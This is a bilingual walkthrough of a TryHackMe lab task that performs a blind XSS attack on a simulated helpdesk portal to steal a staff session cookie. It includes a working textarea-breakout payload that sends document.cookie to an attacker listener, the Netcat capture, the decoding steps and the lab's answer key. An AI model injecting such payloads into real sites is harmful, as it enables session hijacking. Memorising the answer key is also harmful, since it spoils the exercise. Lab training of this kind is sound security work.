# Task 08 · Practical Example (Blind XSS) (التطبيق العملي الكامل: سرقة كوكيز الدعم الفني عبر Blind XSS)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

In this practical capstone task, we apply everything learned throughout the room to execute an end-to-end **Blind XSS attack** against a simulated corporate helpdesk portal: **Acme IT Support**.

### Target Application Architecture:
- Public Customer Portal: Allows registered customers to create and manage support tickets.
- Internal Staff Portal: An isolated administrative ticketing dashboard where corporate support technicians review and triage submitted customer tickets.
- Target Ticket View Context: When staff members open a ticket to inspect customer issues, the customer's text description is rendered directly inside an HTML `<textarea>` tag.

### Objective:
1. Create a customer account on the Acme IT Support portal.
2. Craft an out-of-band exfiltration payload capable of breaking out of the staff viewer's `<textarea>` element.
3. Establish a network listener on port 9001 using Netcat.
4. Submit the support ticket containing the exfiltration payload.
5. Capture the incoming HTTP callback from the staff member's browser, extract the Base64-encoded cookie, decode it, and retrieve the secret `staff-session` token.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **Simulating Corporate Triage Bots:**
   - In training labs like TryHackMe, an automated headless browser bot (e.g., Puppeteer, Selenium) simulates a human staff member reviewing tickets every 30 to 60 seconds.
   - In real-world assessments, Blind XSS payloads must be robust against latency, network timeouts, and corporate outbound proxy restrictions.
2. **Base64 Encoding During Exfiltration:**
   - Why pass `btoa(document.cookie)`? Session cookies frequently contain special characters (spaces, semicolons, `=`, commas). If sent raw over an HTTP query parameter, URL parsing errors or parameter truncation can corrupt the captured token. Base64 encoding ensures safe transport across the HTTP transport layer.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Tier 1 (Conceptual):** The staff member views the ticket inside a `<textarea>`. Your payload must first close this tag with `</textarea>` before injecting the `<script>` tag.
- **Tier 2 (Practical):** Set up a Netcat listener on your machine with `nc -nlvp 9001`. Use the `fetch()` API or an Image beacon pointing to your listener IP: `http://<YOUR_IP>:9001?cookie=` concatenated with `btoa(document.cookie)`.
- **Tier 3 (Direct):** When the listener catches the incoming GET request, copy the value after `?cookie=`, run `echo "<VALUE>" | base64 -d`, and submit the resulting 32-character hexadecimal string.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### Step 1: Start the Network Listener

On the attack platform (AttackBox or Kali VM), open a terminal and start a Netcat listener on port 9001:

```bash
nc -nlvp 9001
```

Expected output:
```
listening on [any] 9001 ...
```

---

### Step 2: Analyze the Staff Viewer Context

By inspecting the client portal and understanding the DOM context described in Task 7 (Level 3), we know that user descriptions are placed inside a textarea element:
```html
<label for="description">Customer Description:</label>
<textarea id="description" readonly>[USER_INJECTED_INPUT]</textarea>
```

If we submit `<script>...`, the browser displays it as plain text inside the box. Therefore, our payload must:
1. Close the textarea: `</textarea>`
2. Open a script block: `<script>`
3. Fetch our listener URL with the Base64-encoded cookie string:
   ```javascript
   fetch('http://10.10.X.Y:9001?cookie=' + btoa(document.cookie));
   ```
4. Close the script: `</script>`

### Full Combined Payload:
```html
</textarea><script>fetch('http://10.10.X.Y:9001?cookie=' + btoa(document.cookie) );</script>
```

---

### Step 3: Submit the Support Ticket

1. In the target browser, navigate to the Acme IT Support portal.
2. Register an account (e.g. `tester` / `password123`) and log in.
3. Click **Create Ticket**.
4. In the Subject field, enter: `Urgent: Network Issue`.
5. In the Description field, paste the exact payload:
   ```html
   </textarea><script>fetch('http://10.10.X.Y:9001?cookie=' + btoa(document.cookie) );</script>
   ```
6. Click **Submit Ticket**.

---

### Step 4: Intercept the Callback & Decode the Session Token

Within approximately 30-45 seconds, the internal support bot opens the ticket. The bot's browser parses the HTML, executes the injected JavaScript, and connects to our Netcat listener.

The terminal captures the incoming HTTP request:
```http
connect to [10.10.X.Y] from (UNKNOWN) [10.10.Z.W] 49152
GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
Host: 10.10.X.Y:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ...
Accept: */*
Referer: http://10.10.Z.W/staff/ticket/view/42
Connection: keep-alive
```

Copy the captured base64 cookie string:
```
c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==
```

Decode the base64 string using the Linux terminal:
```bash
echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d
```

Output:
```
staff-session=4AB305E55955197693F01D6F8FD2D321
```

The value of the `staff-session` cookie is:
```
4AB305E55955197693F01D6F8FD2D321
```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the value of the staff-session cookie?*
  - **Answer:** `4AB305E55955197693F01D6F8FD2D321`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Cookie value `4AB305E55955197693F01D6F8FD2D321` submitted and verified as 100% correct on TryHackMe.
- Full parity between Netcat capture logs and decoded token confirmed.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** يُجسد سيناريو الـ Blind XSS هذا قمة الخطورة في اختبارات الاختراق الواقعية؛ حيث يتمكن مختبر الاختراق الخارجي بصلاحيات مستخدم عادي ومقيد من كسر سياق حقول الدعم الفني (`</textarea>`)، واستدراج المتصفح الإداري الداخلي لإرسال بيانات جلسته الحساسة (`staff-session`) المشفرة عبر اتصال خارجي (Out-of-Band)، محققاً الاستيلاء الكامل على صلاحيات الموظفين الداخليين (Internal Staff Hijacking).
